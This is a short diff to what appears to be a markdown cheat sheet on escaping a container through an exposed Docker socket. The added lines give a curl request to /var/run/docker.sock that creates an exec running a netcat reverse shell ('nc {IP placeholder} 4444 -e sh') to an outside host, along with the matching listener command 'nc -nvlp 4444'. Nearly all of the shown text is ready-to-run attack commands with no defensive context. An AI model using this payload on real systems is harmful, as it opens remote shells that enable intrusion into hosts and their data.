@@ -24,6 +24,18 @@ curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/esca
 }'
 </pre>pre>
 
+## OR 
+<pre>
+  curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/escape/exec -H "Content-Type: application/json" -d '{
+  "AttachStdout": true,
+  "AttachStderr": true,
+  "AttachStdin": false,
+  "Tty": true,
+  "Cmd": ["nc", "{IP placeholder}", "4444", "-e", "sh"]
+  }'
+</pre>
+This has to be combined with "nc -nvlp 4444" on host
+
 # Attach start escape exec and output the content to "test":
 
 <pre>
